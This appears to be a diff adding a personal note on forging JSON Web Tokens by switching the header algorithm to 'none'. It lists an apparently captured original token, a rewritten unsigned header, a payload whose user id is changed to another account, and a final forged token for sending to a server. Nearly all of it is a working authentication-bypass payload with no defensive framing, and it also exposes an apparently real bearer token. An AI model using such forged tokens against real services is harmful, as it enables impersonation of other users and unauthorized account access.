@@ -1,0 +1,22 @@
+Original (including JWT header,payload and signature)
+-----------------------------------------------------
+"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImp0aSI6ImZiNjIzNmU0ZGI1MjA3N2MzMDAzYTNlNjM2NWM5N2UzMDc3YjQ1ZWQ2MjYyOTkwZWRiZGE1YzIyZDRjZTNjMWNkYzBlMzFhODg0MTFjYjBiIn0.eyJhdWQiOiI2IiwianRpIjoiZmI2MjM2ZTRkYjUyMDc3YzMwMDNhM2U2MzY1Yzk3ZTMwNzdiNDVlZDYyNjI5OTBlZGJkYTVjMjJkNGNlM2MxY2RjMGUzMWE4ODQxMWNiMGIiLCJpYXQiOjE3MTE0NDI5NDIsIm5iZiI6MTcxMTQ0Mjk0MiwiZXhwIjoxNzQyOTc4OTQyLCJzdWIiOiI2NDUwOTUiLCJzY29wZXMiOltdfQ.LUq2XTLn1UUAV0eM7vEgwo-5_ORf-18kvuLhJ5O7jNw9GRP1fLjgmY8c4iygD5mrQDcx_rzBpxho0AbY8IUGwrTmYBDRvzWrW2YzOCg_XR6TZTc95MxNJ5KwJuiPdayYgiH-07-HULofW49qBQOZl9ldnGDvEiw4wY8kqU4MAs5KyUNynCok-sqDVD69xGgKLu4s8kPAnfTrPXn5dRtk3nJut3l71nD0naOeBRYsa-59O4T9bDJwUfbUuHGfm36yb5SDDwWbWEY8YPYkpvW7fPSlFP8bKTwwkkMui6IGd5r7Spt_OVH1xMpqt_CRdJ7k9DBDkL9hGN7DKg5zHJIv3YwLJEGJQiU2TmG48S2GFssKS1CQomWtkr7hiYjb5gzyfp7FmtWnxKB1FTfrQeatFYuSGCQE7LDP9O4iMWQuDLjSg4cXq2_q7uendfZfRd5NDG_CAYryTAXdQnl7zFKivcNXm51lb94WJaCHfDP_VPsB4ZKXMy9oJ8c3XeGPKSqqhavCh8P7FeOEDEmjY9YMUvHoVQF22_91XDnNuOy1zBNegHvJQ-uVIjWAnD1OKEwePHWctW0UFn9fj9-QKll2E5folZmr9MvXjmcX-
+L9WTEC9knW73pvFLX4eZcGOdTI3-flGXbUKofOs9y5KB_noNhTftswMhOOKNrvy-SErqKk"
+
+
+JWT header (change into "none")
+--------------------------------
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwianRpIjoiZmI2MjM2ZTRkYjUyMDc3YzMwMDNhM2U2MzY1Yzk3ZTMwNzdiNDVlZDYyNjI5OTBlZGJkYTVjMjJkNGNlM2MxY2RjMGUzMWE4ODQxMWNiMGIifQ==.
+
+JWT payload(change into aything you want e.g sub = userid )
+-------------------------------------------------------------
+
+{"aud":"6","jti":"fb6236e4db52077c3003a3e6365c97e3077b45ed6262990edbda5c22d4ce3c1cdc0e31a88411cb0b","iat":1711442942,"nbf":1711442942,"exp":1742978942,"sub":"645094","scopes":[]}
+
+eyJhdWQiOiI2IiwianRpIjoiZmI2MjM2ZTRkYjUyMDc3YzMwMDNhM2U2MzY1Yzk3ZTMwNzdiNDVlZDYyNjI5OTBlZGJkYTVjMjJkNGNlM2MxY2RjMGUzMWE4ODQxMWNiMGIiLCJpYXQiOjE3MTE0NDI5NDIsIm5iZiI6MTcxMTQ0Mjk0MiwiZXhwIjoxNzQyOTc4OTQyLCJzdWIiOiI2NDUwOTQiLCJzY29wZXMiOltdfQ==.
+
+
+Final cracking combine JWT header and payload together and send to the server (conjucting with . (dot))
+----------------------------------------------------------------------------------------------------------
+
+"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwianRpIjoiZmI2MjM2ZTRkYjUyMDc3YzMwMDNhM2U2MzY1Yzk3ZTMwNzdiNDVlZDYyNjI5OTBlZGJkYTVjMjJkNGNlM2MxY2RjMGUzMWE4ODQxMWNiMGIifQ==.eyJhdWQiOiI2IiwianRpIjoiZmI2MjM2ZTRkYjUyMDc3YzMwMDNhM2U2MzY1Yzk3ZTMwNzdiNDVlZDYyNjI5OTBlZGJkYTVjMjJkNGNlM2MxY2RjMGUzMWE4ODQxMWNiMGIiLCJpYXQiOjE3MTE0NDI5NDIsIm5iZiI6MTcxMTQ0Mjk0MiwiZXhwIjoxNzQyOTc4OTQyLCJzdWIiOiI2NDUwOTQiLCJzY29wZXMiOltdfQ==."
